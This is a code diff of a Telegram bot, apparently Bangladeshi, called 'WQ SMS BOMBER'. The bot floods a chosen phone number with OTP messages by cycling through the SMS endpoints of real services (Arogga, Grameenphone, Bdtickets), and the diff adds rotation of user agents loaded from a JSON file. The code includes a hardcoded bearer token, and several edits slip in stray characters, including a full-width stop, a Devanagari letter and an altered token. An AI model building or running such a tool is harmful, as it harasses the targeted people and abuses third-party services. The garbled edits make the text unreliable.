@@ -1,3 +1,4 @@
+import json
 import os
 import random
 import threading
@@ -27,29 +28,24 @@ def home():
   return "Oustad Bot is Live and Running!"
 
 
-# ইউজার এজেন্ট পুল
-USER_AGENT_DATA = {
-    "user_agent": [
-        (
-            "Mozilla/5.0 (Linux; Android 10; SM-T595"
-            " Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko)"
-            " Chrome/156.0.8078.47 Safari/537.36"
-        ),
-        (
-            "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36"
-            " (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36"
-        ),
-        (
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-            " (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-        ),
-        (
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X)"
-            " AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2"
-            " Mobile/15E148 Safari/604.1"
-        ),
-    ]
-}
+# ── useragent.json ফাইল থেকে ব্রাউজার এজেন্ট লোড করার ফাংশন ──
+def load_user_agents():
+  if os.path.exists("useragent.json"):
+    try:
+      with open("useragent.json", "r", encoding="utf-8") as f:
+        data = json.load(f)
+        if isinstance(data, list) and len(data) > 0:
+          return data
+    except:
+      pass
+  # যদি কোনো কারণে ফাইল না পাওয়া যায়, তবে ডিফল্ট ফলব্যাক এজেন্ট
+  return [
+      (
+          "Mozilla/5.0 (Linux; Android 10; SM-T595"
+          " Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko)"
+          " Chrome/156.0.8078.47 Safari/537.36"
+      )
+  ]
 
 
 class Bomber:
@@ -58,9 +54,11 @@ class Bomber:
     self.user_mobile = user_mobile
     self.number_of_messege = number_of_messege
     self.chat_id = chat_id
+    self.agents = load_user_agents()
 
   def getUserAgent(self):
-    return random.choice(USER_AGENT_DATA["user_agent"])
+    # প্রতিবার কল করলে useragent.json থেকে যেকোনো একটি রেন্ডম এজেন্ট রিটার্ন করবে
+    return random.choice(self.agents)
 
   def aroggo(self):
     url = "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.0.0&os=Android&osv=13"
@@ -117,7 +115,7 @@ class Bomber:
         "x-requested-with": "mark.via.gp",
         "authorization": (
             "Bearer"
-            " eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uX2lkIjoiYTNiZWE3OTAtZjcxOC00NjU4LTg5OTctYzM1MzRhMmEzYzNhIiwiaXNfYW5vbnltb3VzIjp0cnVlLCJ0b2tlbl92ZXJzaW9uIjoxLCJyb2xlcyI6W10sInBlcm1pc3Npb25zIjpbXSwianRpIjoiNWNkNjE3NTMtMjBlYS00YzU0LWExMjctMzBjYzU1YjBjOTg1IiwiaWF0IjoxNzkzNjQ2OTEzLCJleHAiOjE3OTQyNTE3MTN9.Rn2jSWG5MWA5LPI7DDAyvb0tFy37QrSg9aUkKm_oI3k"
+            " eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uX2lkIjoiYTNiZWE3OTAtZjcxOC00NjU4LTg5OTctYzM1MzRhMmEzYzNhIiwiaXNfYW5vbnltb3VzIjp0cnVlLCJ0b2tlbl92ZXJzaW9uIjoxLCJyb2xlcyI6W10sInBlcm1pc3Npb25zIjpbXSwianRpIjoiNWNkNjE3MtMjBlYS00YzU0LWExMjctMzBjYzU1YjBjOTg1IiwiaWF0IjoxNzkzNjQ2OTEzLCJleHAiOjE3OTQyNTE3MTN9.Rn2jSWG5MWA5LPI7DDAyvb0tFy37QrSg9aUkKm_oI3k"
         ),
     }
     phone_num = self.user_mobile
@@ -145,7 +143,7 @@ class Bomber:
           self.chat_id,
           "❌ **পর্যাপ্ত ক্রেডিট নেই!**\nবম্বিং শুরু করতে কমপক্ষে **১ ক্রেডিট**"
           " প্রয়োজন।\nদয়া করে `/refer` কমান্ড ব্যবহার করে রেফার করুন অথবা অ্যাডমিনের"
-          " কাছ থেকে ক্রেডিট রিচার্জ করুন।",
+          " কাছ থেকে ক্রেডিট রিচার্জ করুন。",
           parse_mode="Markdown",
       )
       return
@@ -160,13 +158,12 @@ class Bomber:
     bot.send_message(
         self.chat_id,
         f"🚀 **Target:** `{self.user_mobile}`\n📊 **Target Count:**"
-        f" `{self.number_of_messege}`\n⚡ **কার্যকরী এপিআই দিয়ে বম্বিং শুরু হয়েছে...**\n💳"
-        f" কেটে নেওয়া হয়েছে: `1` ক্রেডিট (বাকি: `{user_credits[self.chat_id]}`"
-        " ক্রেডিট)",
+        f" `{self.number_of_messege}`\n⚡ **JSON ইউজার এজেন্ট নিয়ে বম্বিং শুরু"
+        f" হয়েছে...**\n💳 কেটে নেওয়া হয়েছে: `1` ক্রেডিট (বাকি:"
+        f" `{user_credits[self.chat_id]}` ক্রেডিট)",
         parse_mode="Markdown",
     )
 
-    # শুধু ১০০% কার্যকরী ওয়ার্কিং এপিআইগুলোর লিস্ট
     methods = [
         self.bdtickets,
         self.grameenphone,
@@ -176,7 +173,6 @@ class Bomber:
     counter = 0
     method_index = 0
 
-    # সিরিয়াল অনুযায়ী লুপ চলতে থাকবে যতক্ষণ না সঠিক কাউন্ট পূরণ হয়
     while counter < self.number_of_messege:
       current_method = methods[method_index]
       method_index = (method_index + 1) % len(methods)
@@ -197,7 +193,10 @@ class Bomber:
 
     bot.send_message(
         self.chat_id,
-        f"✅ **টাস্ক সম্পন্ন!**\nTarget: `{self.user_mobile}` এর জন্য নির্ধারিত `{self.number_of_messege}` টি মেসেজ সফলভাবে পাঠানো হয়েছে।",
+        (
+            f"✅ **টাস্ক সম্পন্ন!**\nTarget: `{self.user_mobile}` এর জন্য নির্ধারিত"
+            f" `{self.number_of_messege}` টি মেসেজ সফলভাবে পাঠানো হয়েছে।"
+        ),
         parse_mode="Markdown",
     )
 
@@ -230,7 +229,7 @@ def admin_add_credit(message):
     bot.reply_to(
         message,
         f"✅ সফলভাবে ইউজার `{target_uid}`-কে `{amount}` ক্রেডিট দেওয়া"
-        f" হয়েছে।\nবর্তমান ব্যালেন্স: `{user_credits[target_uid]}` ক্রেডিট।",
+        f" হয়েছে।\nবর্তমান ব্যালেন্স: `{user_credits[target_uid]}` ক্রেডিট。",
         parse_mode="Markdown",
     )
 
@@ -238,8 +237,8 @@ def admin_add_credit(message):
       bot.send_message(
           target_uid,
           f"🎉 **অভিনন্দন!** অ্যাডমিন আপনার অ্যাকাউন্টে `{amount}` ক্রেডিট"
-          f" রিচার্জ করেছেন।\nআপনার বর্তমান মোট ক্রেডিট: `{user_credits[target_uid]}`"
-          " টি।",
+          f" রিচার্জ করেছেন।\nআপনার বর্তমান মোট ক্রেডিট:"
+          f" `{user_credits[target_uid]}` টি।",
           parse_mode="Markdown",
       )
     except:
@@ -327,7 +326,7 @@ def send_welcome(message):
         pass
 
   welcome_text = (
-      "🔥 *স্বাগতম ওস্তাদ! WQ SMS BOMBER প্যানেলে.*\n\n🎁 নতুন জয়েনিং বোনাস:"
+      "🔥 *স্বাগতম ওস্তাদ! WQ SMS BOMBER প্যানেলে.*\n\n🎁 নতুন জয়েনिंग বোনাস:"
       f" **২ ক্রেডিট ফ্রি!**\n💳 আপনার বর্তমান ক্রেডিট: `{user_credits[chat_id]}`"
       " টি\n\nনিচের ফিক্সড কিবোর্ড থেকে আপনার প্রয়োজনীয় অপশনটি সিলেক্ট করুন:"
   )
@@ -363,8 +362,8 @@ def handle_text_buttons(message):
         (
             f"🟢 **Bot Status:** Online & Active\n💳 **Your Credits:**"
             f" `{current_bal}` টি\n⚡ **Your Total Hits:** `{hits}` বার\n🚀"
-            " **APIs Loaded:** Bdtickets, Grameenphone, Arogga\n⚡ **Mode:**"
-            " High Delivery & Sequential"
+            " **APIs Loaded:** Bdtickets, Grameenphone, Arogga\n📂 **User Agent"
+            " Source:** `useragent.json` Loaded"
         ),
         reply_markup=get_reply_keyboard(),
         parse_mode="Markdown",
@@ -375,8 +374,8 @@ def handle_text_buttons(message):
         chat_id,
         (
             "ℹ️ **কীভাবে ব্যবহার করবেন:**\n\n১. `🚀 Start Bombing` বাটনে ক্লিক"
-            " করুন।\n২. টার্গেট নম্বর দিন।\n৩. কতটি মেসেজ পাঠাবেন তা লিখুন (শতভাগ"
-            " ডেলিভারি নিশ্চিত করা হয়েছে)।\n\n🎁 ফ্রি ক্রেডিট পেতে `/refer`"
+            " করুন।\n২. টার্গেট নম্বর দিন।\n৩. কতটি মেসেজ পাঠাবেন তা লিখুন (JSON"
+            " ইউজার এজেন্ট ও সিরিয়াল লজিক যুক্ত)।\n\n🎁 ফ্রি ক্রেডিট পেতে `/refer`"
             " কমান্ড ব্যবহার করুন!"
         ),
         reply_markup=get_reply_keyboard(),
@@ -388,7 +387,7 @@ def handle_text_buttons(message):
         chat_id,
         (
             "👑 **Developer:** WQ OWNER (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
-            " **Status:** Pro Active"
+            " **Status:** Pro Active with JSON UAs"
         ),
         reply_markup=get_reply_keyboard(),
         parse_mode="Markdown",
